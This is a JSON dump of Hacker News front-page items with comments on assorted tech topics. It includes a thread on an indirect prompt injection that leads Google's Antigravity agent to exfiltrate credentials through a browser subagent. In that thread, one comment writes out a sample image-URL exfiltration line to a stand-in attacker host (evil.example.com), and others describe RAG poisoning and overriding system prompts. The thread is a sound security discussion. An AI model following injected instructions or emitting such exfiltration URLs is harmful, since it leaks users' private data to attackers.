[
  {
    "title": "Reinventing how .NET builds and ships (again) (devblogs.microsoft.com)",
    "points": 66,
    "submitter": "IcyWindows",
    "submit_time": "2025-11-25T22:37:48 1764110268",
    "num_comments": 25,
    "comments_url": "https://news.ycombinator.com/item?id=46051691",
    "comments": [
      "I have a lot of respect for the .NET team. They often publish great in-depth articles and their pursuit for performance is relentless (e.g. see Kestrel and Entity Framework evolution).And ASP.NET is one of the few large projects which managed to survive a large breaking changes. Almost to Python 2->3 level. You had to change how your web app behaved completely if you relied on their magic session which worked hard to keep state synched between back and front.Feels good to have 3 trillion dollars interested in improving the stack you use and actually care.Developers! Developers! Developers!reply",
      ".NET was a solid choice for backend builds before Node became so popular (And .NET is generally more performant than Node).I hope this churn in .NET builds is temporary because a lot of people might be looking to go back to something stable especially after the recent supply chain attacks on the Node ecosystem.reply",
      "> I hope this churn in .NET builds is temporary because a lot of people might be looking to go back to something stable especially after the recent supply chain attacks on the Node ecosystem.Can you elaborate a bit? This article talks about internal machinery of building .net releases. What does that have to do with \"this churn\", whatever that is?reply",
      "Not sure about the past tense here. .NET is still excellent and getting even better with every release. What instability are you talking about? There was the leap to .NET Core which was majorly breaking, but that was almost 10 years ago now.reply",
      "This isn't really anything user facing. It's just yet again an example of why monorepos are better.reply",
      "Anything is a monorepo if you submodule hard enough lolreply",
      ".Net need a \"node\" level of developer experience and perfomance of rust/zig since node/python ecosystem rewrite make it more perfomance than everI cant see .net win againts those odds tbhreply",
      "I love working with dotnet, but lately I\u2019ve been writing more backend applications in Python. The code is simpler, testing is simpler since method privacy doesn\u2019t really exist, and code is quicker to deploy because you do not have to compile it.This could also change but in my experience AI is better at generating Python code versus dotnet.reply",
      "Problem is though Python is slow at runtime. May not matter for many use cases, but I've worked with a lot of startups that suffered terrible reliability problems because they chose Python (or Rails, or Node to some extent) and the service cannot handle peak time load without a lot of refactoring and additional app servers.Depending on your framework Python is at best ~3x slower (FastAPI) and at worst ~20x (Django) than asp.net on the techempower benchmarks, which maps pretty well to my real world experience.reply",
      "I don't spend a lot of time building services, but the last few I've done, I actually went straight to Rust. The downside is that it's quite slow to develop -- I probably don't have the knowledge that others do, but it seems that frameworks could really use some work. That said, I love that I can find and fix most my problems during development. Building a service in Python means I'm constantly fixing issues in production..NET is certainly better than Python, but I'm not very happy with the type system and the code organization versus my Rust projects.reply"
    ],
    "link": "https://devblogs.microsoft.com/dotnet/reinventing-how-dotnet-builds-and-ships-again/",
    "first_paragraph": "The world\u2019s most popular IDE just got an upgrade.After I wrote my last post on how .NET builds and ships, I was cautiously optimistic that I wouldn\u2019t be writing another one. Or at least not another one about how we build and ship. That problem was done and dusted. .NET had done it! We\u2019d struck a balance between distributed repository development and the ability to quickly compose a product for shipping. Congratulations everyone, now the infrastructure teams could focus on other things. Security, cross-company standardization, support for building new product features. All the good stuff.\u2026A year and a half later\u2026We\u2019re asking how much it will cost to build 3-4 major versions with a dozen .NET SDK bands between them each month. And keep their engineering systems up to date. And hey, there\u2019s this late breaking fix we want to get into next week\u2019s release, so can I check it in today and have the team validate tonight? It can\u2019t be that hard, right? And I have this new cross-stack feature that"
  },
  {
    "title": "What They Don't Tell You About Maintaining an Open Source Project (andrej.sh)",
    "points": 59,
    "submitter": "andrejsshell",
    "submit_time": "2025-11-25T22:08:25 1764108505",
    "num_comments": 30,
    "comments_url": "https://news.ycombinator.com/item?id=46051393",
    "comments": [
      "> maintaining kaneo means helping people debug their setups. and honestly? it's taught me more than i expected.> people run kaneo on setups i never imagined:> behind corporate proxies> ...> in kubernetes with custom networkingIt's OP's project so they're welcome to support whoever they want but I definitely would not offer free support to customers who are obviously using the product commercially, especially in large enterprises.It's FOSS, so they can use it for free if they want, but if they need custom support or features, they're a great user to tell, \"Sure, I'm happy to help you with that if you purchase a $500/yr support contract.\" You'd be surprised how many customers like that don't care because they have a corporate card and that amount is too little to require approvals or much process.reply",
      "This is not as simple as it sounds. Just yesterday I had a call with the university of technology in Netherland, they want me to add some features on the free version of my FOSS but they did not want to pay anything. Over the last month, I was in contact with a 800B company for a 500$ per year invoice, once we agreed on the general direction they kept adding expectations, first was to sign tons of paperwork with their security checklist, legal stuff which took about a week but when they start asking for things that would take about a week more, I invite them to do extras on a contracting basis, since them I have never heard back and of course they never paid a dimereply",
      "But the company wants a proper invoice. And not every single developer is interested in founding a Limited and getting the tax office breathing down their neck every year.Also, look at Gitea. People got paranoid and forked the project after the original author did exactly that.reply",
      "> But the company wants a proper invoice. And not every single developer is interested in founding a Limited and getting the tax office breathing down their neck every year.I feel like it shouldn't be poor form to say on this site - a site that predominantly has been about building tech companies and revenue streams - to get over it and charge them.reply",
      "Come on, stop with this slave mentality please. You can make invoices without funding any company and without the tax office getting in your hair. It's not illegal to charge for your services and never has been. You can declare that income just fine, or skip it. The tax office won't bother you.reply",
      "This is actually nice and balanced, but the title is misleading. I feel like ALL I hear about maintaining an open source project is how hard it is and how people burn our. I almost never read a blogpost or comment declaring how rewarding it is. So, this was a nice (slightly) more balanced view.reply",
      "This is why I like building outside plant.  You put the fibre up on poles or pull through ducts, splice it, bring it into the building, hook it up to the equipment, make sure it's working and.... you're done.  It works until something breaks, usually for a very clear reason (power outage, drunk driver, rodent, vine, lawnmower man, fibre seeking backhoe, dump truck, direct lightning strike, thermal cycling of a marginal splice, failure to seal a gasket properly resulting in water intrusion that stresses fibres when the water turns into ice, ...), but those become quite rare if you're done your job properly.On the other hand, software is never done.  Even simple features, like headphones, regress these days. (I missed a meeting today because my phone decided to send audio notifications into the black void of the heat death of the universe because I didn't unlock my phone after plugging the headphones into the USB-C port of my iPhone -- the audio didn't come out of the speaker, nor out of the bluetooth of the car I was driving.  No sound worked until after the phone was unlocked.)At least with open source software I can fix the bugs I care about, but the fun goes away once you have to deal with other people to get things merged.Is there a community of software Luddites I can go live with where we build simple technology that works and works well?reply",
      "You're talking about being a tradesman on a forum dedicated to software and maybe making a company out of said software? If people liked the idea of being outside in the weather, doing manual labor as you've described, there is a very large chance they would not be on this forum.reply",
      "It's very often that people here lament the fact that they're not outside being outside, in the weather, doing manual labor. How may of us don't dream, at least once a week, of walking out into the woods, or taking up woodworking instead, or wondering how long it would take to retrain as a plumber?I channel that into my gardening during the appropriate seasons, but now that it's November, all that woodworking equipment in the garage is lookin' mighty appealing.reply",
      "I liked the humble, \u201clessons learned\u201d tone of the post.> every feature you add is a feature you maintain forever.This.Keeping a framework/app/SDK \u201cpure\u201d is very important, in my experience.reply"
    ],
    "link": "https://andrej.sh/blog/maintaining-open-source-project/",
    "first_paragraph": ""
  },
  {
    "title": "A new bridge links the math of infinity to computer science (quantamagazine.org)",
    "points": 116,
    "submitter": "digital55",
    "submit_time": "2025-11-25T19:53:20 1764100400",
    "num_comments": 26,
    "comments_url": "https://news.ycombinator.com/item?id=46049932",
    "comments": [
      "Finally - we can calculate infinity.Been a long way towards it. \\o/reply",
      "If you\u2019re in the Bay Area next month then The Dillinger Escape Plan are bringing the Calculating Infinity circus to town(s):https://www.theregencyballroom.com/events/detail/?event_id=1...This is enormously off topic but if one person sees this and ends up not missing the show then it was worth mentioning.  I think there\u2019s a reasonable crossover between math, discrete math, hacking, and mathcore :)reply",
      "Fairly trivial, in haskell:let x = x in xCompletely encapsulates a countable infinity.reply",
      ">Finally - we can calculate infinity.And Beyond!reply",
      "This has indeed taken forever /sreply",
      "That\u2019s nothing, \u2018node_modules\u2019 has been linking the math of infinity to my filesystem for years.reply",
      "Confused why the article author believes this is a surprise. The foundations of mathematics and computer science are basically the same subject (imho) and dualities between representations in both fields have been known for decades.reply",
      "I studied math for a long time.\nI\u2019m convinced math would be better without infinity. It doesn\u2019t exist. I also think we don\u2019t need numbers too big . But we can leave thosereply",
      "I think we can stop at 8.reply",
      "Is this a joke or are you deeply interested in some ZFC variant that im unaware of? We absolutely need infinity to make a ton of everyday tools work, its like saying we dont need negative numbers because those dont exist either.reply"
    ],
    "link": "https://www.quantamagazine.org/a-new-bridge-links-the-strange-math-of-infinity-to-computer-science-20251121/",
    "first_paragraph": "\nAn editorially independent publication supported by the Simons Foundation.\n\nGet the latest news delivered to your inbox.\nCreate a reading list by clicking the Read Later icon next to the articles you wish to save.Type search term(s) and press enterPopular\n                                    SearchesNovember 21, 2025Valentin Tkach for\u00a0Quanta MagazineStaff WriterNovember 21, 2025All of modern mathematics is built on the foundation of set theory, the study of how to organize abstract collections of objects. But in general, research mathematicians don\u2019t need to think about it when they\u2019re solving their problems. They can take it for granted that sets behave the way they\u2019d expect, and carry on with their work.Descriptive set theorists are an exception. This small community of mathematicians never stopped studying the fundamental nature of sets \u2014 particularly the strange infinite ones that other mathematicians ignore.Their field just got a lot less lonely. In 2023, a mathematician named Ant"
  },
  {
    "title": "Unifying our mobile and desktop domains (wikimedia.org)",
    "points": 91,
    "submitter": "todsacerdoti",
    "submit_time": "2025-11-25T17:07:06 1764090426",
    "num_comments": 19,
    "comments_url": "https://news.ycombinator.com/item?id=46047958",
    "comments": [
      "It was mildly annoying how en.wikipedia.org would redirect to en.m.wikipedia.org on mobile, but en.m.wikipedia.org wouldn't redirect to en.wikipedia.org on desktop. So when a mobile user sent me a link, I had to go and manually delete the '.m' in order to view it nicely. But I guess it makes sense since desktop developers need to be able to see the mobile site sometimes.reply",
      "There was a period I can recall, maybe 2010 to 2020 most prominently, when a subset of HN readers strongly preferred the mobile Wikipedia site, even on desktop, and would always use \".m\" linking to Wikipedia articles in comments threads. This also seemed to happen in reddit threads during that decade.I sort of remember some of the older MediaWiki desktop themes looking worse than the mobile theme, but it was never enough for me personally to try always using the mobile site at the time. I do still strongly prefer old.reddit.com... For as long as that portal continues to exist.reply",
      "Yeah, in the olden days, there was no max-width for desktop wikipedia, so the readability was not good.reply",
      "That's a welcome development albeit late, but more importantly, they should address the \"can't link to a highlight\" problem on mobile. When all sections are collapsed by default, browser won't scroll to the relevant section.A random \"link to highlight\" example: https://en.wikipedia.org/wiki/Henry_I_of_Cyprus#:~:text=On%2...Such a link doesn't work on mobile if it points inside a collapsed section.That makes directing people to relevant content on mobile really hard, and I end up sending screenshots instead.EDIT: \"Link to fragment\"s had the same problem, but apparently, they fixed it. Thanks for that too!reply",
      "About 10 years late, I can't think of any websites other than Wikipedia still doing the mobile domain.reply",
      "YouTube?\nTwitch?\nFaceBook?\nGSMArena? There are lots.reply",
      "m.youtube.com and m.facebook.com redirect you to main \"m-less\" domain when on desktop. That was the greatest problem with Wikipedia. You had to experience that mobile layout on desktop unless you edited the address line and reloaded the page.reply",
      "m.wikipedia.org was a feature, not a bug. The interface is good on desktop. For some time, before Wikipedia did a desktop site rework, this was my go-to frontend.reply",
      "late for what?reply",
      "pc website redirected mobile users from the very beginningmobile website did not redirect pc users10 years late at fixing this very basic problemreply"
    ],
    "link": "https://techblog.wikimedia.org/2025/11/21/unifying-mobile-and-desktop-domains/",
    "first_paragraph": "[[WM:TECHBLOG]]Open Source for Open KnowledgeHow we achieved 20% faster mobile response times, improved SEO, and reduced infrastructure load.Until now, when you visited a wiki (like en.wikipedia.org), the server responded in one of two ways: a desktop page, or a redirect to the equivalent mobile URL (like en.m.wikipedia.org). This mobile URL in turn served the mobile version of the page from MediaWiki. Our servers have operated this way since 2011, when we deployed MobileFrontend.Over the past two months we unified the mobile and desktop domain for all wikis (timeline). This means we no longer redirect mobile users to a separate domain while the page is loading.We completed the change on Wednesday 8 October after deploying to English Wikipedia. The mobile domains became dormant within 24 hours, which confirms that most mobile traffic arrived on Wikipedia via the standard domains and thus experienced a redirect until now.[1][2]Why did we have a separate mobile domain? And, why did we be"
  },
  {
    "title": "A DOOM vector engine for rendering in KiCad, and over an audio jack (mikeayles.com)",
    "points": 53,
    "submitter": "mikeayles",
    "submit_time": "2025-11-25T22:13:35 1764108815",
    "num_comments": 3,
    "comments_url": "https://news.ycombinator.com/item?id=46051449",
    "comments": [
      "Of course I love this. DOOM forever.reply",
      "I got DOOM running in KiCad by rendering it with PCB traces and footprints instead of pixels.Walls are rendered as PCB_TRACK traces, and entities (enemies, items, player) are actual component footprints - SOT-23 for small items, SOIC-8 for decorations, QFP-64 for enemies and the player.How I did it:\nStarted by patching DOOM's source code to extract vector data directly from the engine. Instead of trying to render 64,000 pixels (which would be impossibly slow), I grab the geometry DOOM already calculates internally - the drawsegs[] array for walls and vissprites[] for entities.Added a field to the vissprite_t structure to capture entity types (MT_SHOTGUY, MT_PLAYER, etc.) during R_ProjectSprite(). This lets me map 150+ entity types to appropriate footprint categories.The DOOM engine sends this vector data over a Unix socket to a Python plugin running in KiCad. The plugin pre-allocates pools of traces and footprints at startup, then just updates their positions each frame instead of creating/destroying objects. Calls pcbnew.Refresh() to update the display.Runs at 10-25 FPS depending on hardware. The bottleneck is KiCad's refresh, not DOOM or the data transfer.Also renders to an SDL window (for actual gameplay) and a Python wireframe window (for debugging), so you get three views running simultaneously.Follow-up: ScopeDoomAfter getting the wireframe renderer working, I wanted to push it somewhere more physical. Oscilloscopes in X-Y mode are vector displays - feed X coordinates to one channel, Y to the other. I didn't have a function generator, so I used my MacBook's headphone jack instead.The sound card is just a dual-channel DAC at 44.1kHz. Wired 3.5mm jack \u2192 1k\u03a9 resistors \u2192 scope CH1 (X) and CH2 (Y). Reused the same vector extraction from KiDoom, but the Python script converts coordinates to \u00b11V range and streams them as audio samples.Each wall becomes a wireframe box, the scope traces along each line. With ~7,000 points per frame at 44.1kHz, refresh rate is about 6 Hz - slow enough to be a slideshow, but level geometry is clearly recognizable. A 96kHz audio interface or analog scope would improve it significantly (digital scopes do sample-and-hold instead of continuous beam tracing).Links:\nKiDoom GitHub: https://github.com/MichaelAyles/KiDoom\nScopeDoom GitHub: https://github.com/MichaelAyles/ScopeDoom\nKiDOOM Write-up: https://www.mikeayles.com/#kidoom\nScopeDOOM Write-up:\nHttps://www.mikeayles.com/#scopedoomreply",
      "One of my to-do-one-day projects is an audio jack display system out of a Microcontroller.Was never quite sure if I should raw XY it or soft modem so I could decode on a web page on a handy device.reply"
    ],
    "link": "https://www.mikeayles.com/#kidoom",
    "first_paragraph": "Electronics & Embedded SystemsDesigning and developing engine control systems, firmware, and embedded solutions. Specializing in\n                    ECU development, data analysis, and engineering leadership."
  },
  {
    "title": "Show HN: We built an open source, zero webhooks payment processor (github.com/flowglad)",
    "points": 218,
    "submitter": "agreeahmed",
    "submit_time": "2025-11-25T17:33:50 1764092030",
    "num_comments": 143,
    "comments_url": "https://news.ycombinator.com/item?id=46048252",
    "comments": [
      "The reason webhooks are popular is because they are easy, reliable and they work.Now I might have to spin up a whole area of infrastructure I may not yet have to track eg usage, subscription tier, cancellations etcreply",
      "It looks like this does make some things easier, but I'm not sure if it's actually better.From what I can tell, any time you use this to check something like the customer's subscription state (or anything else payment-related) - either from the front end or the back end - it's going to perform an API request to Flowglad's servers. If you care about responsiveness, I'm not sure that's a good idea. Of course, you can cache that state if you need to access it frequently, but then it kind of defeats the purpose of this layer.Stripe integration can be tricky, but if you don't want to store anything locally, you might as well just hit Stripe's APIs without the middleman. For the payment systems I've worked on, having cached state in the database is actually really nice, even if it's a bit more work. Want to do a complicated query on your customers based on payment/subscription state and a bunch of other criteria? It's just a DB query. With this, I think you'll be hoping they expose an API to query what you need and how you need it. Otherwise, you'll be stuck waiting for a thousand API requests to fetch the state of each of your customers.reply",
      "Yeah this very true.We have a plan to allow you to store more of this data on the merchant's side and still benefit from the work we've done to refine our data model, and make the SDK super usable. Even if you do hit Stripe's APIs, you will need to maintain mappings of price ids to your plans, your plans to what features you grant for each, stripe customer ids to your customer ids, etc. That's the kind of grunt work and maintenance burden we'd like to eliminate.Plus, Stripe is explicitly designed to be a write-optimized system, and discourages[0] using them as a realtime read layer. We're super early in the journey but that's the problem we want to solve: how can we give software devs the same unified money movement + value movement experience that Shopify has availed to DTC brands for nearly 20 years?[0] https://docs.stripe.com/rate-limitsreply",
      "Congratulations on the beta launch, an impressive product we will consider integrating.As a relatively new developer, I'm curious why the dependancy on React?Was there no way to get the UI you wanted without implementing a framework like React?We are Svelte based, so it's frustrating for us to have to drag in React for libraries like this.reply",
      "That\u2019s a great point.We started with React because that\u2019s what we knew best and the community we were most embedded in.We have no dogmatic attachment to React. We hope to support Svelte and Vue soon. We\u2019ll start on that once we feel that our data model and flow are sufficiently nailed down that we feel comfortable committing to porting our SDK to other frontend frameworks.reply",
      "Appreciate the response. I suppose the follow up is, why not make the library framework agnostic initially or work towards that, rather than have to maintain support for x number of frameworks into the future?reply",
      "That\u2019s a devilish engineering question. If you are truly framework agnostic you limit how much work you can do for your users, because a lot of the work happens inside of the framework. We decided we\u2019d commit to doing the work so our customers didn\u2019t have to.E.g. most web apps have some endpoint that the client calls to initiate a checkout session by calling their payment processor\u2019s server SDK.How many times has the following code been implemented because no payment processor ships a route handler and a React hook (pardon my React-brainedness)?Someone has to do the work to get that checkout request from your frontend to your payment provider and then back so you can redirect. In a just world, that your processor\u2019s SDK would handle that work. Otherwise it falls on your plate.reply",
      "How does this work in terms of having a merchant bank? Surely you need something else besides this repo right?reply",
      "Yes, while this is OSS, we haven't yet figured out how to self host an acquiring bank partnership... For now we're using Stripe Connect to set up a merchant account through our Stripe Connect platform. So as long as you are a legal entity (individual or business) in the countries that Stripe does merchant acquiring you should be good to go with us.Eventually we want to get to a place where we are embedded deeper on the payments side. But for now that's the flow.reply",
      "You still need to have a payment provider / merchant account, so that part remains the sameFor all I could see this is no different than any other payment gateway service. Well, it is different in one important way: you'll pay a higher percentage per transaction, since the middle man needs to make money somehow.reply"
    ],
    "link": "https://github.com/flowglad/flowglad",
    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        Open source payments + billing infrastructure\n       There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.\n\n\n\n\n\n\n\n\n    The easiest way to make internet money.\n    \nGet Started\n\n\n    \u00b7\n    Quickstart\n    \u00b7\n    Website\n    \u00b7\n    Issues\n    \u00b7\n    Discord\n\n\n\n\n\n\n\n\n\n\n\n    Infinite pricing models, one source of truth, zero webhooks.\n  First, install the packages necessary Flowglad packages based on your project setup:Flowglad integrates seamlessly with your authentication system and requires only a few lines of code to get started in your Next.js app. Setup typically takes under a minute:Create a utility to generate your Flowglad server instance. Pass your own customer/user/organization IDs\u2014Flowglad never requires its own customer IDs to be managed in your app:Add an API route"
  },
  {
    "title": "The fall of Labubus and the mush of modern internet trends (michigandaily.com)",
    "points": 40,
    "submitter": "gnabgib",
    "submit_time": "2025-11-23T23:42:22 1763941342",
    "num_comments": 34,
    "comments_url": "https://news.ycombinator.com/item?id=46028548",
    "comments": [
      "Adam Conover argued that the craze is an indicator of economic nihilism, that people who can\u2019t afford these things buy them anyways as an expression of hopelessness that they\u2019ll ever have a pathway to legitimately changing their station: https://youtu.be/l1O6bN2zWSM?si=QGd51tfmh8lOjezkreply",
      "Maybe things go a little faster now, but doesn't seem too different from Pogs, or Beanie Babies or any other trend in a long line of them.reply",
      "beanie babies were rational, there was a supply constriction that seemed permanent, the founder resolved it and flooded the market, leaving bagholders and decades of mockerybut I would content it was not an example of irrational exuberancelabubu\u2019s are part of a flooded market as well, but there was never anything to suggest it wouldnt be flooded only an expectation for demand to keep up longer than just half of this yearreply",
      "Labubus got extra kick from being gambling also.  Many were sold in boxes without labels or with minimal labels that listed possible contents.  That makes the actual product into more of a loot box kind of thing. That might have contributed to the speed of the trend passing.reply",
      "I think I heard it was a bit more than that - you'd buy them online direct, blind, and be informed immediately after purchase what it was you'd actually bought, so bringing in the immediacy and \"convenience\" of online gambling/gacha/etc. too, compared to ordering a mystery box and opening it when it was delivered, or buying foil packs of trading cards where you need to actually be present at a particular location.reply",
      "I recently learned that many collectables are sold this way!Labubus just happened to get a wide appeal and had a moment in the US for some reason..reply",
      "They are and I hate it. It\u2018s bad enough with trading cards, but now every single collectible is employing gacha mechanics and it\u2019s frustrating.reply",
      "\"Everything is gambling now\"reply",
      "So were pogsreply",
      "> it\u2019s clear that Labubus are on the downswingOn the other hand, they've only recently penetrated my greater social circle, so I'm not so certain as this author that the trend has ended.reply"
    ],
    "link": "https://www.michigandaily.com/arts/digital-culture/the-fall-of-labubus-and-the-mush-of-modern-internet-trends/",
    "first_paragraph": "The Michigan Daily\n\t\t\t\t\tOne hundred and thirty-five years of editorial freedom\t\t\t\tLabubu.The word alone is enough to make some people break out in a cold sweat, and it\u2019s hard to blame them. These fuzzy, diminutive creatures, complete with a stare some have described as demonic, became truly inescapable over this past summer. Everywhere I turned, from the airport to the mall to the bathroom at my below-minimum-wage job, Labubus followed, staring at me ominously from backpacks and keychains.Labubus began innocently enough, originating in 2015 from a picture book series by Kasing Lung before they were made into toys. However, after slowly gaining traction throughout 2024 and early 2025, Labubus exploded in popularity over the summer, flying off store shelves around the world. Resale prices skyrocketed as demand rose and they became harder to come across, to the point where some people instead opted to knowingly shell out money to buy fake Labubus, affectionately referred to as \u201cLafufus.\u201d "
  },
  {
    "title": "Google Antigravity exfiltrates data via indirect prompt injection attack (promptarmor.com)",
    "points": 555,
    "submitter": "jjmaxwell4",
    "submit_time": "2025-11-25T18:31:16 1764095476",
    "num_comments": 149,
    "comments_url": "https://news.ycombinator.com/item?id=46048996",
    "comments": [
      "I really liked Simon's Willison's [1] and Meta's [2] approach using the \"Rule of Two\".  You can have no more than 2 of the following:- A) Process untrustworthy input\n- B) Have access to private data\n- C) Be able to change external state or communicate externally.It's not bullet-proof, but it has helped communicate to my management that these tools have inherent risk when they hit all three categories above (and any combo of them, imho).[EDIT] added \"or communicate externally\" to option C.[1] https://simonwillison.net/2025/Nov/2/new-prompt-injection-pa...\n[2] https://ai.meta.com/blog/practical-ai-agent-security/reply",
      "It's really vital to also point out that (C) doesn't just mean agentically communicate externally - it extends to any situation where any of your users can even access the output of a chat or other generated text.You might say \"well, I'm running the output through a watchdog LLM before displaying to the user, and that watchdog doesn't have private data access and checks for anything nefarious.\"But the problem is that the moment someone figures out how to prompt-inject a quine-like thing into a private-data-accessing system, such that it outputs another prompt injection, now you've got both (A) and (B) in your system as a whole.Depending on your problem domain, you can mitigate this: if you're doing a classification problem and validate your outputs that way, there's not much opportunity for exfiltration (though perhaps some might see that as a challenge). But plaintext outputs are difficult to guard against.reply",
      "Can you elaborate? How does an attacker turn \"any of your users can even access the output of a chat or other generated text\" into a means of exfiltrating data to the attacker?Are you just worried about social engineering \u2014 that is, if the attacker can make the LLM say \"to complete registration, please paste the following hex code into evil.example.com:\", then a large number of human users will just do that? I mean, you'd probably be right, but if that's \"all\" you mean, it'd be helpful to say so explicitly.reply",
      "Ah, perhaps answering myself: if the attacker can get the LLM to say \"here, look at this HTML content in your browser: ... img src=\"https://evil.example.com/exfiltrate.jpg?data= ...\", then a large number of human users will do that for sure.reply",
      "So if an agent has no access to non-public data, that's (A) and (C) - the worst an attacker can do, as you note, is socially engineer themselves.But say you're building an agent that does have access to non-public data - say, a bot that can take your team's secret internal CRM notes about a client, or Top Secret Info about the Top Secret Suppliers relevant to their inquiry, or a proprietary basis for fraud detection, into account when crafting automatic responses. Or, if you even consider the details of your system prompt to be sensitive. Now, you have (A) (B) and (C).You might think that you can expressly forbid exfiltration of this sensitive information in your system prompt. But no current LLM is fully immune to prompt injection that overrides its system prompt from a determined attacker.And the attack doesn't even need to come from the user's current chat messages. If they're able to poison your database - say, by leaving a review or comment somewhere with the prompt injection, then saying something that's likely to bring that into the current context via RAG, that's also a way of injecting.This isn't to say that companies should avoid anything that has (A) (B) and (C) - tremendous value lies at this intersection! The devil's in the details: the degree of sensitivity of the information, the likelihood of highly tailored attacks, the economic and brand-integrity consequences of exfiltration, the tradeoffs against speed to market. But every team should have this conversation and have open eyes before deploying.reply",
      "Your elaboration seems to assume that you already have (C). I was asking, how do you get to (C) \u2014 what made you say \"(C) extends to any situation where any of your users can even access the output of a chat or other generated text\"?reply",
      "You can't process untrustworthy data, period.  There are so many things that can go wrong with that.reply",
      "that's basically saying \"you can't process user input\". sure you can take that line, but users wont find your product to be very usefulreply",
      "I recall that. In this case, you have only A and B and yet, all of your secrets are in the hands of an attacker.It's great start, but not nearly enough.EDIT: right, when we bundle state with external Comms, we have all three indeed. I missed that too.reply",
      "Not exactly. Step E in the blog post:> Gemini exfiltrates the data via the browser subagent: Gemini invokes a browser subagent per the prompt injection, instructing the subagent to open the dangerous URL that contains the user's credentials.fulfills the requirements for being able to change external statereply"
    ],
    "link": "https://www.promptarmor.com/resources/google-antigravity-exfiltrates-data",
    "first_paragraph": "SolutionsIndustriesPartnersResourcesBook a DemoThreat IntelligenceGoogle Antigravity Exfiltrates DataCellShock: Claude AI is Excel-lent at Stealing DataHijacking Claude Code via Injected Marketplace PluginsData Exfiltration from Slack AI via Indirect Prompt InjectionData Exfiltration from Writer.com with Indirect Prompt InjectionCase Study in OWASP for LLM Top 10Case study in MITRE AtlasThreat IntelligenceTable of ContentTable of ContentTable of ContentAn indirect prompt injection in an implementation blog can manipulate Antigravity to invoke a malicious browser subagent in order to steal credentials and sensitive code from a user\u2019s IDE.Antigravity is Google\u2019s new agentic code editor. In this article, we demonstrate how an indirect prompt injection can manipulate Gemini to invoke a malicious browser subagent in order to steal credentials and sensitive code from a user\u2019s IDE.Google\u2019s approach is to include a disclaimer about the existing risks, which we address later in the article.\u00a0Let"
  },
  {
    "title": "LLVM Adds Constant-Time Support for Protecting Cryptographic Code (trailofbits.com)",
    "points": 18,
    "submitter": "birdculture",
    "submit_time": "2025-11-25T23:26:38 1764113198",
    "num_comments": 5,
    "comments_url": "https://news.ycombinator.com/item?id=46052090",
    "comments": [
      "Too bad that Intel chips more or less reserve the right to take LLVM\u2019s nice output and make it non-constant-time anyway.  See:https://www.intel.com/content/www/us/en/developer/articles/t...Sure, you could run on some hypothetical OS that supports DOITM and insert syscalls around every manipulation of secret data. Yeah, right.reply",
      "Sorry, I may be missing the point here, but reading that page doesn\u2019t immediately make it obvious to me what that feature is. Is it some constant time execution mechanism that you can enable / disable on a per-thread basis to do\u2026 what exactly?reply",
      "Last I saw, it seemed like the plan was to unconditionally enable it, and on the off chance there's ever a piece of hardware where it's a substantial performance win, offer a way to opt out of it.reply",
      "This link seems broken. Some searching suggests that the title and slug may have changed, but I haven't found a working link to the article. Just from the title alone, I am extremely interested in reading more about this, because it's been largely mythical for a long time.reply",
      "https://web.archive.org/web/20251125224147/https://blog.trai...reply"
    ],
    "link": "https://blog.trailofbits.com/2025/11/25/constant-time-support-lands-in-llvm-protecting-cryptographic-code-at-the-compiler-level/",
    "first_paragraph": ""
  },
  {
    "title": "How to repurpose your old phone into a web server (far.computer)",
    "points": 168,
    "submitter": "louismerlin",
    "submit_time": "2025-11-22T18:16:59 1763835419",
    "num_comments": 71,
    "comments_url": "https://news.ycombinator.com/item?id=46016902",
    "comments": [
      "If the device can run PostmarketOS with a mainstream kernel, then it can run any Linux distribution.  (I put Arch ARM on such devices, since I like that distro.)That's the big hurdle though - mainstream kernel support.For most devices, even if they can be rooted and jailbroken,  you're stuck with the kernel they come with.  Doesn't have a new feature you need?  A horrible security flaw in the network stack?  You're out of luck.  Most \"repurpose your old phone\" approaches have this problem.  You can make it a server but you wouldn't want to expose it to the public Internet.reply",
      "Is Arch ARM officially supported by the same team? If not, what might be the reason?reply",
      "x86_64 is the only official Arch Linux.  All other ports are unofficial.  They are community projects where many of the members are the same as the main Arch Linux.I think it's basically for the same reason as why they dropped 32-bit x86 support about 8 years ago.  Not enough users. (That resulted in the unofficial Arch Linux 32 to maintain support.)reply",
      "Arch is working to officially support ARM and non x86_64 archs.https://rfc.archlinux.page/0032-arch-linux-ports/reply",
      "That RFC says \"New ports are added by proposing them in an RFC. At least two package maintainers have to lead a port to ensure it will be developed longer term.\" but I'm not finding any RFC for ARM support, so can one say work is really officially happening on ARM?reply",
      "The thing that holds me back from this is always the battery. I want to have my battery removed so that it doesn't eventually become a time bomb, but it's a pain on modern phones and I'm not even sure if they boot without. The mobile hardware reuse space can suck for hobbyists.reply",
      "Most phones can have battery removed somewhat destructively, but without affecting the rest of the phone.Generally, as long as you keep the phone plugged in, the battery should be safe virtually indefinitely - the battery management on board will keep it in a state where its a constant charge which means the chemistry will be stable.reply",
      "There were several generalizations in that statement that align with my similar fears to the OP.  Most firmware should minimize the charge cycling, most batteries should be stable at constant charge... most isn't great for something that I want to sit in the corner undisturbed for a decade just chugging along - I have a few old desktops I use whenever I need a stand alone server or to host something web-live for a while.  They'll eventually have hardware failures, but I have a lot more confidence that when they fail it won't be dramatic or destructive - ditto with old laptops, the serviceability expectations are much higher than phones so I have yet to meet a laptop I can't pop open and just pull the battery out of to run on AC alone - in the case of a power failure the UPS can't cover I'd rather the machine just power off rather than needing to deal with the possibility of dramatic failure.I think if you're considering re-harvesting old devices to use for hosting and get far enough down your list to get to phones then you've likely got enough constant maintenance costs in overseeing things that the additional worry of fire risk just isn't worth it.reply",
      "> Generally, as long as you keep the phone plugged in, the battery should be safe virtually indefinitelyWhat is your source on this?I've replaced the battery in always-plugged-in iPhone 3 times over 10 years because it was expanding into a spicy pillow.I too want a way to run phones directly off of USB power, without a battery present.reply",
      "Go to ifixit.com, look up your phone's battery replacement steps, stop half way through :)reply"
    ],
    "link": "https://far.computer/how-to/",
